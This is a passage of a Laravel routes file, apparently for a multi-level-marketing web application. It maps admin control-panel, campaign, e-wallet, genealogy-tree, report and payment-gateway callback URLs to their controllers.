        /*  For the crud of priority management   */

        Route::resource('/helpdesk/tickets/priority', 'Helpdesk\Ticket\TicketsPriorityController');

        Route::get('helpdesk/tickets/priorities/delete/{id}', 'Helpdesk\Ticket\TicketsPriorityController@destroy');

        Route::get('/helpdesk/tickets/priorities/data', 'Helpdesk\Ticket\TicketsPriorityController@data');











        // Route::post('/helpdesk/tickets/departments/update', 'Helpdesk\Ticket\TicketsDepartmentsController@update');

        // Route::post('/helpdesk/tickets/departments/destroy', 'Helpdesk\Ticket\TicketsDepartmentsController@destroy');



        // Route::post('/helpdesk/tickets/departments/data', 'Helpdesk\Ticket\TicketsDepartmentsController@data');



     

        /**

         * Ticket types

         *

         */

    



        /*  For the crud of ticket-type management   */

        Route::resource('/helpdesk/tickets/ticket-type', 'Helpdesk\Ticket\TicketsTypeController');

        Route::get('helpdesk/tickets/ticket-types/delete/{id}', 'Helpdesk\Ticket\TicketsTypeController@destroy');

        Route::get('/helpdesk/tickets/ticket-types/data', 'Helpdesk\Ticket\TicketsTypeController@data');



 

        /**

         * Configure ticket system : Alerts & Notification

         *

         * New ticket alert

         * Status - radio enable disable

         *

         */

        // COMMENETD OUT BY ASLAM. WHY THIS IS HERE ALONE?



        // Route::post('post_ticket_category', 'TicketConfigurationsController@store_ticket_category');

  

    

        #purchase history

        Route::get('purchase-history', 'ProductController@purchasehistory');

        Route::get('purchase-history/{id}/delete', 'ProductController@delete_order');

        Route::get('purchase-history/{id}/confirm', 'ProductController@confirm_order');

        Route::post('purchase-history', 'ProductController@purchasehistoryshow');

        #member management

        Route::get('member', 'MemberController@index');

        Route::post('member/search', 'MemberController@search');

        #Register new memeber

        Route::get('xpress', 'RegisterController@xpress');

        Route::get('cancelreg', 'RegisterController@cancelreg');

        Route::get('register/{placement_id}', 'RegisterController@index');

        Route::get('register', 'RegisterController@index');

        Route::post('register', 'RegisterController@register');

        // Route::post('register/data/', 'RegisterController@data');

        Route::get('voucherverify', 'RegisterController@voucherverify');

        Route::get('register/preview/{idencrypt}', 'RegisterController@preview');



        Route::get('lead', 'LeadviewController@leadview');

        Route::post('lead-update', 'LeadviewController@updatelead');

        Route::get('lead/data', 'LeadviewController@data');

        Route::post('deletelead', 'LeadviewController@deletelead');

        Route::get('getstatus', 'LeadviewController@getstatus');

        Route::get('documentupload', 'DocumentController@upload');

        Route::post('uploadfile', 'DocumentController@uploadfile');

        Route::get('deletedocument/{id}', 'DocumentController@deletedocument');

        Route::post('updatedocument', 'DocumentController@updatedocument');

        Route::get('download/{name}', 'DocumentController@getDownload');



        /**

         * Notes

         */

        // dd

        Route::get('notes', 'NotesController@index');

        Route::post('post-note', 'NotesController@postNote');

        Route::post('remove-note', 'NotesController@removeNote');







        /**

         * Campaigns

         */

        Route::get('campaign/lists', 'Marketing\Campaign\CampaignController@index');

        Route::get('campaign/create', 'Marketing\Campaign\CampaignController@create');

        Route::get('campaign/edit/{id}', 'Marketing\Campaign\CampaignController@edit');

         Route::get('campaign/view/{id}', 'Marketing\Campaign\CampaignController@view');

        Route::post('campaign/editcampaign', 'Marketing\Campaign\CampaignController@editcampaign');

        Route::post('campaign/save', 'Marketing\Campaign\CampaignController@store');

        Route::get('campaign/lists/change-status', 'Marketing\Campaign\CampaignController@changestatus');

        Route::get('campaign/delete/{id}', 'Marketing\Campaign\CampaignController@delete');



        //edit profile



         Route::post('payout_info/edit/{id}', 'UserController@payout_update');

         Route::get('createhypperwalletid/{id}', 'UserController@createhypperwalletid');

         Route::post('loginPassword_settings', 'UserController@loginPassword_settings');
         Route::post('security_settings', 'UserController@security_settings');

         Route::post('transactionPassword_settings', 'UserController@transactionPassword_settings');

         Route::post('2fa_authentication/{id}', 'UserController@enable_2fa_authentication');

  



        /**

         * Campaigns contact lists

         */







        /**

         * View contact list index

         */

        Route::get('campaign/contactlist', 'Marketing\Contacts\ContactsController@contactListIndex');







        /**

         * Create contact list

         */

        Route::post('campaign/contactlist/create', 'Marketing\Contacts\ContactsController@createContactList');





    



        /**

         * Edit contact list

         */

        Route::get('campaign/contactlist/{id}/edit', 'Marketing\Contacts\ContactsController@editContactList');

        Route::post('campaign/contactlist/{id}/edit', 'Marketing\Contacts\ContactsController@saveContactList');





        Route::get('campaign/contactlist/{id}/show', 'Marketing\Contacts\ContactsController@ShowContactList');









        /**

         * Destroy contact list

         */

        Route::get('campaign/contactlist/destroy/{id}', 'Marketing\Contacts\ContactsController@destroyContactList');



        Route::get('campaign/contactlist/data', 'Marketing\Contacts\ContactsController@ContactListData');

        Route::get('campaign/contactlist/data/{id}', 'Marketing\Contacts\ContactsController@singleListContactData');





        /**

         * Show in contact list

         */

















        /**

         * Create contact

         */







        /**

         * Edit contact

         */





        /**

         * View contact

         */





        /**

         * View contact list - index with contact groups

         */

        Route::get('campaign/contacts/data', 'Marketing\Contacts\ContactsController@data');

   

        Route::resource('campaign/contacts', 'Marketing\Contacts\ContactsController');

        //Route::get('campaign/contacts/delete/{id}','Marketing\Contacts\ContactsController@destroy');

    

        //VIEW

        //EDIT

        //DELETE

        //BEING THIS A RESOURCE













    

    

    







        /**

         * Campaigns contacts list groups

         */



  





        /**

         * Campaigns autoresponders

         */

        Route::get('campaign/autoresponders', 'Marketing\Campaign\CampaignController@autorespondersIndex');

        Route::get('campaign/autoresponders/create', 'Marketing\Campaign\CampaignController@createAutoResponder');

        Route::post('campaign/autoresponders/create_autoresp', 'Marketing\Campaign\CampaignController@create_autoresp');

        Route::get('campaign/autoresponders/edit_autoresponder/{id}', 'Marketing\Campaign\CampaignController@edit_autoresponder');

        Route::post('campaign/autoresponders/editautoresponder', 'Marketing\Campaign\CampaignController@editautoresponder');

        Route::get('campaign/autoresponders/delete_autorespnse/{id}', 'Marketing\Campaign\CampaignController@delete_autorespnse');

  





        /**

         * Activity listing

         */

        Route::get('all_activities', 'ActivityController@index');

    



        /**

         * Online Store

         */



         Route::get('online-store/dashboard', 'OnlineStoreController@index');







        /**

         * Control Panel

         * BY ASLAM - NEW PAGES AND CRUD

         */

    

        Route::get('control-panel', 'ControlPanel\ControlPanelController@index');

        Route::get('control-panel/update-option', 'ControlPanel\ControlPanelController@UpdateOptionKeyValueAjax');

    

        /*home page



        * Dijil Palakkal



        */

        Route::get('control-panel/control-home-edit', 'ControlPanel\SystemSettings\SettingsController@index');

        Route::post('control-panel/control-home-edit', 'ControlPanel\SystemSettings\SettingsController@update');



        Route::get('control-panel/backup_manager', 'ControlPanel\SystemSettings\SettingsController@db_manager');

        //Route::get('control-panel/control-email-backup', 'ControlPanel\SystemSettings\SettingsController@db_manager');

        Route::post('control-panel/db_management', 'ControlPanel\SystemSettings\SettingsController@db_management');



        /**

         * Control Panel - Branding settings

         *

         */

        Route::get('control-panel/branding', 'ControlPanel\Branding\BrandingControlPanelController@index');

        Route::patch('control-panel/branding', 'ControlPanel\Branding\BrandingControlPanelController@UpdateBranding');



        /**

         * Control Panel - Design settings

         *

         */

        Route::get('control-panel/design', 'ControlPanel\Design\DesignControlPanelController@index');

        Route::patch('control-panel/design', 'ControlPanel\Design\DesignControlPanelController@UpdateDesign');

        Route::patch('control-panel/design/font-size', 'ControlPanel\Design\DesignControlPanelController@UpdateThemeFontSize');







        /**

         * Control Panel - Menu manager

         *

         */

        Route::get('control-panel/menu-manager', 'ControlPanel\Menu\MenuControlPanelController@index');

        Route::patch('control-panel/menu-manager', 'ControlPanel\Menu\MenuControlPanelController@UpdateMenu');

        // Route::patch('control-panel/design', 'ControlPanel\Design\DesignControlPanelController@UpdateDesign');

    







        /**

         * Control Panel - Performance Settings

         *

         */

        Route::get('control-panel/performance', 'ControlPanel\Performance\PerformanceControlPanelController@index');



         Route::get('artisan-peroform-commands/{cmd}', function ($q) {



            Artisan::call('make:controller', ['name'=>'Admin\ControlPanel\SystemSettings\SystemSettingsController']);

         });





        Route::post('control-panel/performance/clear-cache-all', 'ControlPanel\Performance\PerformanceControlPanelController@clearCacheAll');

        Route::post('control-panel/performance/clear-cache-application', 'ControlPanel\Performance\PerformanceControlPanelController@clearCacheApplication');

        Route::post('control-panel/performance/clear-cache-config', 'ControlPanel\Performance\PerformanceControlPanelController@clearCacheConfig');

        Route::post('control-panel/performance/clear-cache-views', 'ControlPanel\Performance\PerformanceControlPanelController@clearCacheViews');

        Route::post('control-panel/performance/clear-cache-routes', 'ControlPanel\Performance\PerformanceControlPanelController@clearCacheRoutes');



        Route::post('control-panel/performance/cache-config', 'ControlPanel\Performance\PerformanceControlPanelController@cacheConfig');





        /**

         * Control Panel - Idle TimeOut settings

         *

         */

        Route::get('control-panel/idle-timeout', 'ControlPanel\IdleTimeOut\IdleTimeOutControlPanelController@index');

        Route::post('control-panel/idle-timeout', 'ControlPanel\IdleTimeOut\IdleTimeOutControlPanelController@UpdateIdleTimeOut');











        /**

         * Control Panel - Account Settings

         *

         */

        Route::get('control-panel/account-settings', 'ControlPanel\AccountSettings\AccountSettingsControlPanelController@index');

    

        Route::post('control-panel/account-settings', 'ControlPanel\AccountSettings\AccountSettingsControlPanelController@update');

        Route::post('control-panel/email_settings', 'ControlPanel\AccountSettings\AccountSettingsControlPanelController@store');







        /**

         * Control Panel - Organization tree Settings

         *

         */

        Route::get('control-panel/organization-tree-settings', 'ControlPanel\OrganizationTree\OrganizationTreeControlPanelController@index');

        Route::post('control-panel/organization-tree-settings', 'ControlPanel\OrganizationTree\OrganizationTreeControlPanelController@update');





        /**

         * Control Panel - Commission Settings

         *

         */

        Route::get('control-panel/commission-settings', 'ControlPanel\Commission\CommissionControlPanelController@index');

        // Route::patch('control-panel/commission-settings', 'ControlPanel\Commission\CommissionControlPanelController@update');



        //commissions-shilpa

        Route::post('control-panel/add-binarycommission', 'ControlPanel\Commission\CommissionControlPanelController@binaryupdate');

        Route::post('control-panel/add-levelcommission', 'ControlPanel\Commission\CommissionControlPanelController@levelcommissionupdate');

        Route::post('control-panel/add-sponsorcommission', 'ControlPanel\Commission\CommissionControlPanelController@sponsorcommissionupdate');

        Route::post('control-panel/add-matchingbonus', 'ControlPanel\Commission\CommissionControlPanelController@matchingbonusupdate');



        //payout



        Route::get('control-panel/payout-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@index');

        Route::post('control-panel/payout-manager', 'ControlPanel\PayoutManger\PayoutConfigurationManager@update');

        Route::post('control-panel/hyperwallet_input', 'ControlPanel\PayoutManger\PayoutConfigurationManager@hyperwallet_input');

        Route::post('control-panel/paypal_input', 'ControlPanel\PayoutManger\PayoutConfigurationManager@paypal_input');

        Route::post('control-panel/btc_input', 'ControlPanel\PayoutManger\PayoutConfigurationManager@btc_input');

        Route::post('payout_options', 'ControlPanel\PayoutManger\PayoutConfigurationManager@payout_options');

        Route::post('payout_gateway_input', 'ControlPanel\PayoutManger\PayoutConfigurationManager@payout_gateway_input');







         Route::get('control-panel/blacklist-manager', 'ControlPanel\SystemSettings\SettingsController@blacklist');

         Route::post('control-panel/blacklist-manager', 'ControlPanel\SystemSettings\SettingsController@updateblacklist');

         Route::get('control-panel/ban-ip', 'ControlPanel\SystemSettings\SettingsController@ban_ip');

         Route::post('control-panel/ban-ip', 'ControlPanel\SystemSettings\SettingsController@updateban_ip');

         Route::get('control-panel/ban_ip/delete/{id}', 'ControlPanel\SystemSettings\SettingsController@ban_ip_delete');

         Route::get('control-panel/blocklist/delete/{id}', 'ControlPanel\SystemSettings\SettingsController@blocklist_delete');



        /**

         * Control Panel - Package Manager - CHANGED FROM PLAN SETTINGS TO THIS PAGE

         *

         */

        Route::get('control-panel/package-manager', 'ControlPanel\PackageManager\PackageManagerControlPanelController@index');

        Route::get('control-panel/package-manager/edit/{id}', 'ControlPanel\PackageManager\PackageManagerControlPanelController@view_edit');

        Route::patch('control-panel/package-manager/edit/{id}', 'ControlPanel\PackageManager\PackageManagerControlPanelController@update');







        /**

         * Control Panel - Bonus Settings

         *

         */

        Route::get('control-panel/bonus-settings', 'ControlPanel\Bonus\BonusControlPanelController@index');

        Route::get('control-panel/bonus-settings/edit/{id}', 'ControlPanel\Bonus\BonusControlPanelController@view_edit');

        Route::patch('control-panel/bonus-settings/edit/{id}', 'ControlPanel\Bonus\BonusControlPanelController@update');

    

        Route::get('control-panel/bonus-settings/matchingbonus/edit/{id}', 'ControlPanel\Bonus\BonusControlPanelController@matchingbonus_view_edit');

        Route::patch('control-panel/bonus-settings/matchingbonus/edit/{id}', 'ControlPanel\Bonus\BonusControlPanelController@matchingbonus_update');







         /**

         * Control Panel - Rank Settings

         *

         */

        Route::get('control-panel/rank-settings', 'ControlPanel\Rank\RankSettingsControlPanelController@index');

        Route::patch('control-panel/rank-settings', 'ControlPanel\Rank\RankSettingsControlPanelController@update');

           



         /**

         * Control Panel - Sign Up Bonus Settings

         *

         */

        Route::get('control-panel/sign_up_bonus_settings', 'ControlPanel\Rank\RankSettingsControlPanelController@sign_up_bonus_settings');

        Route::patch('control-panel/sign_up_bonus_settings', 'ControlPanel\Rank\RankSettingsControlPanelController@sign_up_bonus_settings_update');



             /**

         * Control Panel - Salary Settings

         *

         */

        Route::get('control-panel/salary_settings', 'ControlPanel\Salary\SalarySettingsController@index');

        Route::patch('control-panel/salary_settings', 'ControlPanel\Salary\SalarySettingsController@update');



        Route::get('control-panel/ewallet_settings', 'ControlPanel\Ewallet\AdminEwalletController@ewalltindex');

        Route::patch('control-panel/ewallet_settings', 'ControlPanel\Ewallet\AdminEwalletController@ewalletupdate');





         /**

         * Control Panel - Riward Settings

         *

         */

        Route::get('control-panel/riward_settings', 'ControlPanel\Rank\RankSettingsControlPanelController@riward_index');

        Route::patch('control-panel/riward_settings', 'ControlPanel\Rank\RankSettingsControlPanelController@riward_update');

        /**

         * Control Panel - Currency manager

         *

         */



        #CurrencyController

        // Route::get('currency', 'CurrencyController@index');

        // Route::post('currency', 'CurrencyController@update');

        // Route::post('currency/add', 'CurrencyController@create');

        // Route::get('currency/delete/{id}', 'CurrencyController@destroy');





        Route::get('control-panel/currency-manager', 'ControlPanel\Currency\CurrencyControlPanelController@index');

        Route::post('control-panel/currency-manager', 'ControlPanel\Currency\CurrencyControlPanelController@update');

        Route::post('control-panel/currency-manager/add', 'ControlPanel\Currency\CurrencyControlPanelController@create');

        Route::get('control-panel/currency-manager/delete/{id}', 'ControlPanel\Currency\CurrencyControlPanelController@destroy');

        Route::get('control-panel/control-email_manager', 'ControlPanel\SystemSettings\SettingsController@email_manager');

        Route::post('control-panel/control-welcomemail_settings', 'ControlPanel\SystemSettings\SettingsController@updatewelcome');

        Route::post('control-panel/control-payout_email', 'ControlPanel\SystemSettings\SettingsController@payout_email');



    

        //Route::post('welcomemail', 'ControlPanel\SystemSettings\SettingsController@updatewelcome');

        // Route::post('payoutnotifications', 'ControlPanel\SystemSettings\SettingsController@payoutupdate');



         Route::post('control-panel/control-smtp_settings', 'ControlPanel\SystemSettings\SettingsController@smtp_settings');





          // Route::get('sales','ProductController@salesrecord');
         Route::get('approvesales', 'OnlineStoreController@approvesales');
         Route::get('rejected_orders', 'OnlineStoreController@rejected_orders');

          Route::get('sales', 'OnlineStoreController@salesdet');

           Route::get('sales/data', 'OnlineStoreController@salesrecord');

          Route::get('salesrecordsdata', 'OnlineStoreController@salesrecordsdata');

          Route::get('invoice/{id}', 'OnlineStoreController@viewmore');
          Route::get('approve_orders/{id}', 'OnlineStoreController@approve_orders');
          Route::get('reject_orders/{id}', 'OnlineStoreController@reject_orders');

          Route::get('notificationpayout', 'SettingsController@notificationpayout');

          Route::post('payout_access_settings', 'SettingsController@payout_access_settings');

           Route::get('useraccounts/changetoaccount/{crypt}', 'UserController@changetoaccount'); 
          Route::post('useraccounts/changetoaccount/{id}', 'UserController@updatetoaccount'); 
          
          Route::get('useraccounts', 'UserController@useraccounts');
          Route::get('useraccounts/data', 'UserController@useraccountsdata');

          Route::post('useraccounts', 'UserController@useraccounts');

          Route::get('userprofiles/{user}', 'UserController@viewprofile');

          Route::get('incomedetails/{id}', 'UserController@incomedetails');

          Route::get('referraldetails/{id}', 'UserController@referraldetails');

          Route::get('ewalletdetails/{id}', 'UserController@ewalletdetails');

          Route::get('payoutdetails/{id}', 'UserController@payoutdetails');

          Route::get('paypal/register', 'RegisterController@paypalReg');





        // Route::patch('control-panel/design', 'ControlPanel\Design\DesignControlPanelController@UpdateDesign');

     



        /*

         Control Panel - campaign-manager

           */

        

        Route::get('control-panel/campaign-manager', 'Marketing\Campaign\CampaignController@campaign_manager');

        Route::post('control-panel/campaign-manager/add', 'Marketing\Campaign\CampaignController@campaigngroup_create');



        Route::get('control-panel/campaign-manager/delete/{id}', 'Marketing\Campaign\CampaignController@delete_group');

        Route::get('control-panel/campaign-manager/edit_group/{id}', 'Marketing\Campaign\CampaignController@edit_group');

        Route::post('control-panel/campaign-manager/editgroup', 'Marketing\Campaign\CampaignController@editgroup');

       

           /*

         Control Panel - Help desk

           */



         Route::get('control-panel/helpdesk-manager', 'ControlPanel\SystemSettings\SettingsController@helpdeskManager');



         /* Control Pannel - Ecommerce Manager routes

         */



          Route::get('control-panel/ecommerce-manager', 'ControlPanel\Ecommerce\EcommerceController@ecommerceManager');

          Route::post('control-panel/category', 'ControlPanel\Ecommerce\EcommerceController@category');

           Route::get('control-panel/category-edit/{id}', 'ControlPanel\Ecommerce\EcommerceController@categoryEdit');

           Route::post('control-panel/category-edit', 'ControlPanel\Ecommerce\EcommerceController@categoryEditPost');

           Route::get('control-panel/category-delete/{id}', 'ControlPanel\Ecommerce\EcommerceController@categoryDelete');



           Route::post('control-panel/add-product', 'ControlPanel\Ecommerce\EcommerceController@addProduct');

           Route::get('control-panel/delete-product/{id}', 'ControlPanel\Ecommerce\EcommerceController@deleteProduct');



           Route::get('control-panel/product-edit/{id}', 'ControlPanel\Ecommerce\EcommerceController@EditProduct');

           Route::post('control-panel/product-edit-post', 'ControlPanel\Ecommerce\EcommerceController@EditProductPost');



     /**

        * Control Panel - CMS manager

        *

        */



         Route::get('control-panel/cms_manager', 'ControlPanel\cms_manager\cmsController@index');

        Route::post('control-panel/cms_manager', 'ControlPanel\cms_manager\cmsController@store');



           /**

        * Control Panel - Voucher manager

        *

        */



        Route::get('control-panel/voucher-manager', 'ControlPanel\Voucher\VoucherControlPanelController@index');

        Route::post('control-panel/voucher-manager/savelimit', 'ControlPanel\Voucher\VoucherControlPanelController@saveDailyLimit');









 

        Route::model('User', 'App\User', function () {

            throw new NotFoundHttpException;

        });

        Route::get('api/dropdown', function () {

            $id     = Input::get('username');

            $models = User::find($id)->username;

            return $models->lists('name', 'id');

        });

    });





/**

 * Testing funtions to be removed from app when distributing

 */

    

    Route::group(['prefix' => 'factory', 'middleware' => ['web', 'auth'], 'namespace' => 'Factory'], function () {

        Route::get('dummynetwork/{userslimit}', 'DemoUtils\DemoUtilsController@dummynetwork');

        Route::get('dummytickets/{ticketslimit}', 'DemoUtils\DemoUtilsController@dummytickets');

        Route::get('dummymails', 'DemoUtils\DemoUtilsController@dummymails');

        Route::get('dummyvouchers', 'DemoUtils\DemoUtilsController@dummyvouchers');

    });









    Route::group(['prefix' => 'user', 'middleware' => 'auth', 'namespace' => 'user'], function () {

        Route::get('dashboard', 'dashboard@index');
        Route::get('joinphase/3', 'dashboard@joinphase');

        Route::get('getMonthUsers', 'dashboard@getmonthusers');

        Route::get('suggestlist', 'UserController@suggestlist');
        Route::get('myaccount', 'UserController@myaccount');

        Route::get('profile', 'ProfileController@index');

        Route::post('profile/edit/{id}', 'ProfileController@update');

        Route::post('profile/edit/{id}', ['as' => 'user.saveprofile', 'uses' => 'ProfileController@update']);

        Route::post('currency', 'ProfileController@currency');

        Route::post('leg-setting', 'ProfileController@legsetting');

        Route::post('rs-setting', 'ProfileController@rssetting');

        Route::get('states/{id}', 'ProfileController@getstates');

        // Route::get('getEdit', 'ProfileController@getEdit');

        Route::post('getEdit', 'ProfileController@postEdit');

        Route::get('createhypperwalletid/{id}', 'ProfileController@createhypperwalletid');

        Route::post('2fa_authentication/{id}', 'ProfileController@enable_2fa_authentication');

        // user password settings

        Route::post('loginPassword_settings', 'ProfileController@loginPassword_settings');

        Route::post('transactionPassword_settings', 'ProfileController@transactionPassword_settings');

        // user paypout details update

        Route::post('payout_info/edit/{id}', 'ProfileController@payout_update');

        Route::get('pagination/fetch_data', 'MailController@fetch_data');

   









     
    



        Route::get('ewallet', 'Ewallet@index');

        Route::post('ewallet', 'Ewallet@index');

        Route::get('wallet/data', 'Ewallet@data');

        Route::get('viewreferals', 'ViewReferals@index');

        //mail system



        Route::get('mark-as-read/{msg_id}', 'MailController@mark_as_read');





        Route::get('inbox', 'MailController@index');

        Route::post('mail/delete', 'MailController@destroy');

        Route::get('compose', 'MailController@compose');

        Route::get('compose/{from}', 'MailController@reply');

        Route::post('reply', 'MailController@save1');

        Route::post('send', 'MailController@save');

        Route::get('user_validate/{sponsor}', 'UserController@validateuser');



         Route::get('genealogy/{treeid}', 'TreeController@index');
         Route::get('genealogy/{treeid}/{accountid}', 'TreeController@index');
        Route::post('genealogy/getTree/{levellimit}/{treeid}/{accountid}', 'TreeController@indexPost');

        Route::post('tree-up', 'TreeController@treeUp');

        Route::get('tree-up', 'TreeController@treeUp');

        //tree

        Route::get('tree', 'TreeController@tree');

        Route::get('treedata', 'TreeController@treedata');

        Route::get('childdata', 'TreeController@childdata');

        // sponsor tree

        Route::get('sponsortree', 'TreeController@sponsortree');

        Route::post('getsponsortree', 'TreeController@postSponsortree');



    

         Route::get('viewnews/{id}', 'DocumentController@viewnews');

         Route::get('allnews', 'DocumentController@allnews');

         Route::get('allvideos', 'DocumentController@allvideos');

    

 



        Route::post('getsponsortreeurl', 'TreeController@getsponsortreeurl');

        Route::post('sponsor-up', 'TreeController@sponsortreeUp');

        Route::get('sponsor-up', 'TreeController@sponsortreeUp');

        Route::post('sponsor-up/{base64}', 'TreeController@sponsortreeUp');

        Route::post('sponsor-child/{base64}', 'TreeController@sponsortreechild');

         Route::post('getsponsorchildrenByUserName/{base64}/{levellimit}', 'TreeController@getsponsorchildrenByUserName');

        Route::get('getsponsorchildrenByUserName/{base64}/{levellimit}', 'TreeController@getsponsorchildrenByUserName');



         /**

         * getChildrenGenealogy {$id} for nested childrens in chart

         */



        //tree

        Route::post('genealogy/getChildrenGenealogyByUserName/{base64}/{levellimit}/{treeid}', 'GenealogyTreeController@getChildrenGenealogyByUserName');

        Route::get('getChildrenGenealogy/{base64}/{levellimit}/{treeid}', 'GenealogyTreeController@getChildrenGenealogy');

        Route::post('getChildrenGenealogy/{base64}/{levellimit}/{treeid}', 'GenealogyTreeController@getChildrenGenealogy');

        Route::post('getParentGenealogy/{base64}/{levellimit}/{treeid}', 'GenealogyTreeController@getParentGenealogy');

        Route::post('getParentGenealogy/{base64}/{levellimit}/{treeid}', 'GenealogyTreeController@getParentGenealogy');

        Route::post('search/autocomplete', 'GenealogyTreeController@autocomplete');
         Route::post('search_new/binary/autocomplete/{treeid}', 'GenealogyTreeController@autocompletebinaryNew');
         Route::post('search/binary/autocomplete', 'GenealogyTreeController@autocompletebinary');



        //user bitaps preview-shilpa start

        Route::get('get-bitaps-status/{id}', 'dashboard@bitaps');

        Route::get('bitapspreview/{idencrypt}', 'dashboard@bitapspreview');

        Route::get('store-bitaps-status/{id}', 'dashboard@storebitaps');



        //user bitaps preview-shilpa start





        //userplan purchase preview-shilpa

        Route::get('get-purcomplete-status/{id}', 'productController@purcompletestatus');

        Route::get('purchase/complete/{idencrypt}', 'productController@purcompleteview');

        //userplan purchase preview-shilpa



        //paypal response start

        //paypal reg

        Route::get('paypal/success/{id}', 'RegisterController@paypalsuccess');

        Route::post('paypal/success/{id}', 'RegisterController@paypalsuccess');

        //paypal plan purchase

        Route::get('paypal/planpurchase/{id}', 'productController@planpurchasepaypal');

        Route::post('paypal/planpurchase/{id}', 'productController@planpurchasepaypal');

        //paypal product purchase

        Route::get('paypal/storesuccess/{id}', 'OnlineStoreController@paypalstoresuccess');

        Route::post('paypal/storesuccess/{id}', 'OnlineStoreController@paypalstoresuccess');

        //paypal response end

     

        //rave response start

        //rave reg

        Route::get('ravecallback', 'RegisterController@ravecallback');

        Route::post('ravecallback', 'RegisterController@ravecallback');

        //rave product purchase

        Route::get('ravestorepur', 'OnlineStoreController@ravestorepur');

        Route::post('ravestorepur', 'OnlineStoreController@ravestorepur');

        //rave plan purchase

        Route::get('raveplanpurchase', 'productController@raveplanpurchase');

        Route::post('raveplanpurchase', 'productController@raveplanpurchase');

        //rave response end



        //skrill response start

        //skrill reg

        Route::get('skrill/success/{id}', 'RegisterController@skrillsuccess');

        Route::post('skrill/success/{id}', 'RegisterController@skrillsuccess');

        Route::get('skrill-status/{id}', 'RegisterController@skrillstatus');

        Route::post('skrill-status/{id}', 'RegisterController@skrillstatus');

        //skrill product purchase

        Route::get('skrill/storesuccess/{id}', 'OnlineStoreController@skrillstoresuccess');

        Route::post('skrill/storesuccess/{id}', 'OnlineStoreController@skrillstoresuccess');

        Route::get('skrill-storestatus/{id}', 'OnlineStoreController@skrillstorestatus');

        Route::post('skrill-storestatus/{id}', 'OnlineStoreController@skrillstorestatus');

        //skrill plan purchase

        Route::get('skrillplansuccess/{id}', 'productController@skrillplansuccess');

        Route::post('skrillplansuccess/{id}', 'productController@skrillplansuccess');

        Route::get('skrillplan-status/{id}', 'productController@skrillplanstatus');

        Route::post('skrillplan-status/{id}', 'productController@skrillplanstatus');

        //skrill response end



        //ipaygh response start

        //ipaygh reg

        Route::get('paymentnotify/success/{id}/{username}', 'RegisterController@ipaysuccess');

        Route::get('paymentnotify/canceled/{id}/{username}', 'RegisterController@ipaycanceled');

        Route::get('paymentnotify/ipn', 'RegisterController@ipayipn');

        Route::post('paymentnotify/success', 'RegisterController@ipaysuccess');

        Route::post('paymentnotify/canceled', 'RegisterController@ipaycanceled');

        Route::post('paymentnotify/ipn', 'RegisterController@ipayipn');

        //ipaygh product purchase

        Route::get('paymentnotify/storesuccess/{id}/{username}', 'OnlineStoreController@ipayghstoresuccess');

        Route::get('paymentnotify/storecanceled/{id}/{username}', 'OnlineStoreController@ipayghstorecanceled');

        Route::get('paymentnotify/storeipn', 'OnlineStoreController@ipayghstoreipn');

        Route::post('paymentnotify/storesuccess', 'OnlineStoreController@storesuccess');

        Route::post('paymentnotify/storecanceled', 'OnlineStoreController@storecanceled');

        Route::post('paymentnotify/storeipn', 'OnlineStoreController@storeipn');

        //ipaygh plan purchase

        Route::get('ipayghplansuccess/{id}/{username}', 'productController@ipayghplansuccess');

        Route::get('ipayghplancanceled/{id}/{username}', 'productController@ipayghplancanceled');

        Route::get('ipayghplanipn', 'productController@ipayghplanipn');

        Route::post('ipayghplansuccess', 'productController@ipayghplansuccess');

        Route::post('ipayghplancanceled', 'productController@ipayghplancanceled');

        Route::post('ipayghplanipn', 'productController@ipayghplanipn');

        //ipaygh response end





    

        Route::get('payoutrequest', 'PayoutController@index');

        Route::post('request', 'PayoutController@request');

        Route::get('allpayoutrequest', 'PayoutController@viewall');

        Route::get('reg', 'PayoutController@reg');

        Route::get('requestvoucher', 'VoucherController@index');

        Route::post('vouch-request', 'VoucherController@vouchrequest');

        Route::get('viewvoucher', 'VoucherController@viewvoucher');

        Route::get('myvoucher', 'VoucherController@myvouch');



        Route::get('getPayout', 'PayoutController@getpayout');

        Route::get('income', 'IncomeDetailsController@index');

        Route::post('income', 'IncomeDetailsController@index');

        Route::get('fund-transfer', 'Ewallet@fund');

        Route::post('fund-transfer', 'Ewallet@fundtransfer');

        Route::get('my-transfer', 'Ewallet@mytransfer');



         Route::get('cash_wallet', 'Ewallet@cash_wallet');

        Route::get('salary_wallet', 'Ewallet@salary_wallet');

Route::get('reward_wallet', 'Ewallet@reward_wallet');

Route::get('redemption_wallet', 'Ewallet@redemption_wallet');

        #view-mycode

        Route::get('view-adds', 'CodeController@index');

        Route::post('view-adds', 'CodeController@show');

        Route::get('purchase-history', 'productController@purchasehistory');

        #products

        Route::get('purchase-plan', 'productController@index');

        Route::post('purchase-plan', 'productController@purchase');

        Route::get('purchase-history', 'productController@purchasehistory');

        ###

        Route::get('repurchase', 'productController@repurchase');

        Route::post('repurchaseuser', 'productController@repurchaseuser');

        Route::post('repurchase_pro', 'productController@repurchase_pro');

        #Register new memeber

        Route::get('register/{placement_id}', 'RegisterController@index');

        Route::get('register', 'RegisterController@index');

        Route::post('register', 'RegisterController@register');

        Route::get('register/preview/{idencrypt}', 'RegisterController@preview');

        // Route::post('register/data/','RegisterController@data');

        Route::get('xpress', 'RegisterController@xpress');

        #Reports

        Route::get('pvreport', 'ReportController@pvreport');

        Route::post('pvreport', 'ReportController@pvreportview');

        Route::get('salereport', 'ReportController@salereport');

        Route::post('salereport', 'ReportController@salereportview');

        Route::get('incomereport', 'ReportController@ewalletreport');

        Route::post('incomereport', 'ReportController@ewalletreportview');

        Route::get('pairingreport', 'ReportController@pairingreport');

        Route::post('pairingreport', 'ReportController@pairingreportview');

        Route::post('carryreport', 'ReportController@carryreportview');

        Route::get('payoutreport', 'ReportController@payoutreport');

        Route::post('payoutreport', 'ReportController@payoutreportview');

        Route::get('transactionreport', 'ReportController@salereport');

        Route::post('transactionreport', 'ReportController@salereportview');

        Route::get('summaryreport', 'ReportController@summuryreport');

        Route::post('summaryreport', 'ReportController@summuryreportview');

        Route::get('maintenancereport', 'ReportController@maintenancereport');

        Route::post('maintenancereport', 'ReportController@maintenancereportview');

        Route::get('groupsalesbonus', 'ReportController@groupsalesbonus');

        Route::post('groupsalesbonus', 'ReportController@groupsalesbonusview');

        Route::post('groupsalesbonusdetails/{id}', 'ReportController@groupsalesbonusdetails');

        Route::get('lead', 'LeadviewController@leadview');

        Route::post('lead', 'LeadviewController@updatelead');

        Route::post('delete_lead', 'LeadviewController@deletelead');

